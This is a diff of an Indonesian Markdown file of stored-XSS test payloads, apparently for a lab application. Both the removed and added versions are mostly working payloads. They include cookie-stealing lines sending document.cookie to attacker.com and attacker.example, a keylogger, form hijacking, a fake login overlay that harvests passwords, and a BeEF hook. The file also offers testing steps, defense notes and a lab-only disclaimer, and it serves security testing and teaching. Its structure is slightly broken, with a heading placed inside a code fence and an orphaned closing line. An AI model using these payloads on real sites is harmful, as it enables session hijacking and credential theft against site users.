@@ -6,133 +6,133 @@ File ini berisi contoh-contoh payload untuk testing Stored XSS vulnerability.
 
 ### 1. Simple Alert
 ```html
-<script>alert('XSS')</script>
-```
+# 🎯 XSS Payload Examples (Non-<script> Variants)
 
-### 2. Alert with Document Info
+File ini berisi contoh-contoh payload untuk testing Stored XSS (fokus pada payload yang tidak menggunakan tag `<script>` karena tag `<script>` sering tidak dieksekusi ketika dimasukkan via innerHTML pada browser modern).
+
+## Mengapa hindari `<script>` saat testing?
+
+Browser modern tidak mengeksekusi tag `<script>` yang dimasukkan ke DOM lewat `innerHTML` atau mekanisme yang setara. Jika aplikasi Anda menyuntikkan HTML mentah menggunakan `innerHTML` (atau React `dangerouslySetInnerHTML`), tag `<script>` mungkin ada di DOM tetapi tidak akan dijalankan. Sebagai gantinya, gunakan payload berbasis atribut/event (mis. `onerror`, `onload`) atau tag yang mengeksekusi event handler seperti `svg`, `img`, `iframe`, dll.
+
+## SVG-based Payloads
+
 ```html
-<script>alert(document.domain)</script>
+<svg onload=alert('XSS')></svg>
 ```
 
-### 3. Alert with Cookie
 ```html
-<script>alert(document.cookie)</script>
+<svg><animate onbegin="alert('XSS')" attributeName="x" /></svg>
 ```
 
-## Cookie Stealing Payloads
-
-### 4. Redirect dengan Cookie
 ```html
-<script>document.location='http://attacker.com?cookie='+document.cookie</script>
+<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>
 ```
 
-### 5. Fetch API untuk Steal Cookie
+## IMG/Event-handler Payloads
+
 ```html
-<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+<img src=x onerror="alert('XSS')">
 ```
 
-### 6. Image Tag dengan Cookie Stealing
 ```html
-<img src=x onerror="fetch('http://attacker.com/log?cookie='+document.cookie)">
+<img src=1 onerror=confirm('XSS')>
 ```
 
-## Advanced XSS Payloads
-
-### 7. Keylogger
 ```html
-<script>
-document.onkeypress = function(e) {
-    fetch('http://attacker.com/log?key=' + e.key);
-}
-</script>
+<img src=x onerror="fetch('http://attacker.example/steal?cookie='+document.cookie)">
 ```
 
-### 8. Form Hijacking
+## Event Attributes on Common Elements
+
 ```html
-<script>
-document.querySelector('form').addEventListener('submit', function(e) {
-    e.preventDefault();
-    var data = new FormData(this);
-    fetch('http://attacker.com/steal', {
-        method: 'POST',
-        body: data
-    });
-});
-</script>
+<div onclick="alert('XSS')">Click me</div>
 ```
 
-### 9. Phishing Overlay
 ```html
-<script>
-document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;"><h1>Session Expired</h1><form onsubmit="fetch(\'http://attacker.com/phish\',{method:\'POST\',body:JSON.stringify({u:this.username.value,p:this.password.value})});return false;"><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><button>Login</button></form></div>';
-</script>
+<input autofocus onfocus="alert('XSS')">
 ```
 
-### 10. BeEF Hook
 ```html
-<script src="http://attacker.com:3000/hook.js"></script>
+<body onload="alert('XSS')">
 ```
 
-## DOM-based XSS Payloads
+## Data / URI and iframe-based Payloads
 
-### 11. Inject Script via innerHTML
 ```html
-<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
+<iframe src="data:text/html,<svg onload=alert('XSS')>"></iframe>
 ```
-*Note: atob() decodes base64, payload di atas adalah alert('XSS');*
 
-### 12. Event Handler XSS
 ```html
-<svg onload=alert('XSS')>
-<body onload=alert('XSS')>
-<input onfocus=alert('XSS') autofocus>
+<iframe src="data:text/html,<img src=x onerror=alert(document.domain)>"></iframe>
 ```
 
-## Bypassing Filters
+## JavaScript URI (Click Required)
 
-### 13. Case Variation
-```html
-<ScRiPt>alert('XSS')</ScRiPt>
-```
-
-### 14. Encoded Payload
-```html
-<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
-```
-
-### 15. JavaScript Protocol
 ```html
 <a href="javascript:alert('XSS')">Click me</a>
 ```
 
-### 16. Data URI
+## Style / CSS-based Vectors (Edge cases)
+
 ```html
-<iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
+<div style="background-image: url(javascript:alert('XSS'))">XSS</div>
 ```
 
-## Testing Steps
+## Media and Other Tags
 
-1. **Login ke aplikasi** sebagai user manapun
-2. **Buat post** dengan salah satu payload di atas
-3. **Refresh halaman** untuk melihat stored XSS dieksekusi
-4. **Perhatikan** bahwa payload tersimpan dan akan dieksekusi untuk semua user
-
-## Cookie Stealing Demo
-
-Untuk test cookie stealing dengan server sederhana:
-
-### Setup Simple HTTP Server (Python)
-```bash
-# Terminal 1: Start simple HTTP server untuk terima cookie
-python -m http.server 8000
-```
-
-Kemudian gunakan payload:
 ```html
-<script>
-fetch('http://localhost:8000/stolen?cookie=' + document.cookie)
-</script>
+<audio src onerror="alert('XSS')"></audio>
+<video><source onerror="alert('XSS')"></video>
 ```
+
+## Advanced: DOM APIs via Event Handlers
+
+Kadang penyerang memanggil `fetch()` atau `Image()` untuk mengirim data ke server penyerang:
+
+```html
+<img src=x onerror="new Image().src='http://attacker.example/collect?c='+document.cookie">
+```
+
+atau
+
+```html
+<svg onload="fetch('http://attacker.example/collect?c='+document.cookie)"></svg>
+```
+
+## Testing Steps (praktis)
+
+1. Login ke aplikasi sebagai user target (mis. `korban`).
+2. Buat post baru berisi salah satu payload di atas (mulai dari `img`/`svg` yang paling sederhana).
+3. Buka halaman posts di browser lain atau akun lain, refresh dan perhatikan apakah alert/fetch/event terjadi.
+4. Jika tidak terjadi, cek DevTools → Console/Network dan cek:
+   - Apakah konten payload dikirim mentah oleh backend? (Network → response JSON)
+   - Apakah payload muncul di DOM? (Elements tab)
+   - Apakah ada header CSP yang memblokir execution? (Console)
+
+## Contoh Cookie-stealing (untuk lab testing saja)
+
+Gunakan server sederhana untuk menerima GET request (Python `python -m http.server 8000` tidak menerima GET query logging by default — gunakan server custom atau intercept dengan Burp/Netcat). Payload contoh:
+
+```html
+<img src=x onerror="new Image().src='http://attacker.example/steal?cookie='+encodeURIComponent(document.cookie)">
+```
+
+Atau dengan `fetch` (lebih modern):
+
+```html
+<svg onload="fetch('http://attacker.example/steal', {method:'POST', body:document.cookie})"></svg>
+```
+
+## Defense Notes
+
+- Gunakan sanitasi input (mis. DOMPurify / sanitize-html) di server/klien.
+- Gunakan output encoding: render sebagai text (`textContent`) bukan HTML.
+- Siapkan CSP yang tepat dan cookie flags (`HttpOnly`, `SameSite`, `Secure`).
+- Hindari menyimpan sensitive token di place yang dapat diakses JS (gunakan `HttpOnly` cookie).
+
+## Disclaimer
+
+Contoh payload di atas hanya untuk tujuan pembelajaran dan pengujian pada environment yang Anda miliki atau yang Anda diberi izin untuk diuji. Penggunaan payload ini pada sistem tanpa izin adalah ilegal.
 
 Cek terminal Python untuk melihat cookie yang dicuri.
 
